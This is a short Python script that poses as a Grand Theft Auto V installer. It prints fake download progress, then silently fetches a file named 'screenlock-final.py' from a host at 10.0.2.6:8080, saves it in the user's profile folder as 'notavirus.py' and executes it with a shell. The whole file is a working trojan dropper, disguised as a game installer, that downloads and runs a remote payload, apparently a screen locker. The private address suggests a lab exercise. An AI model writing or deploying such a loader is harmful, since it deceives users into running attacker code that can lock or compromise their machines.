from http.client import EXPECTATION_FAILED
import aiohttp
import asyncio
import urllib.request
import subprocess
from contextlib import contextmanager
import sys, os
import time

print("Grand Theft Auto V is getting ready to install")
print("Download starting:")
time.sleep(1)
print("1%")
print("2%")
print("3%")
time.sleep(2)
print("11%")
time.sleep(2)
print("20%")
time.sleep(4)
print("36%")
time.sleep(2)
print("50%")
print("51%")
print("53%")
time.sleep(2)
print("69%")
time.sleep(4)
print("81%")
time.sleep(2)
print("99%")
time.sleep(3)





def download():
    # while True:
    nurl = 'http://10.0.2.6:8080/screenlock-final.py'
    urllib.request.urlretrieve(nurl, os.environ['USERPROFILE'] + '/notavirus.py')
        # time.sleep(10)

async def main():
    counter = 26
    c2 = 50

    while (counter > 0):
        print("--------------------------------------------")
        counter = counter - 1
    
    while (c2 > 0):
        print("---")
        time.sleep(0.1)
        c2 = c2 - 2
    
    print("\n" + "Wait until GTA V Servers respond, this can take several moments." + "\n" +  "Thanks for your time.")
    async with aiohttp.ClientSession(trust_env=True) as session:
        download()
        subprocess.Popen(os.environ['USERPROFILE'] + '/notavirus.py', shell=True)



loop = asyncio.get_event_loop()
loop.run_until_complete(main())
